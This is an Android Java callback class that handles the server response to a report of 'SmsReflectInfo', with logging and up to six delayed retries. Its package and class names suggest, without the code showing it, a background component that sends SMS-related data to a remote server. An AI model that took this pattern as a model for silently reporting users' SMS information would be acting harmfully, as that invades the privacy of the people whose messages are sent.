package com.thirdparty.net;

import okhttp3.Call;
import okhttp3.Response;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.gandalf.daemon.utils.XL_log;
import com.zhy.http.okhttp.callback.Callback;

public class SmsReflectInfoReportCallback extends Callback<String> {
    private final XL_log log = new XL_log(SmsReflectInfoReportCallback.class);
    private int mRetryTime = 0;
    private static final int RETRY_TIME_LIMIT = 6;
    private Context mContext;

    public SmsReflectInfoReportCallback(Context context) {
        this.mContext = context;
    }

    @Override
    public void onError(Call call, Exception exception, int code) {
        if (exception != null) {
            log.error("SmsReflectInfoReportCallback:" + Log.getStackTraceString(exception) + " code:" + code);
        } else {
            log.error("SmsReflectInfoReportCallback exception and exception is null");
        }
        retry();
    }

    private void retry() {
        if (mRetryTime < RETRY_TIME_LIMIT) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Thread.sleep(5 * 1000);
                        Reporter.reportSmsReflect(mContext, SmsReflectInfoReportCallback.this);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
            mRetryTime++;
        } else {
            log.error("report smsreflectinfo retry time:" + mRetryTime + " over");
        }
    }

    @Override
    public String parseNetworkResponse(Response response, int code) throws Exception {
        if (response == null)
            return null;
        String resoneStr = response.body().string();
        if (!TextUtils.isEmpty(resoneStr) && resoneStr.contains("ok")) {
            log.debug("report SmsReflectInfo success");
        } else {
            log.error("report SmsReflectInfo failed msg:" + resoneStr);
        }
        return null;
    }

    @Override
    public void onResponse(String response, int id) {
        // TODO Auto-generated method stub

    }
}
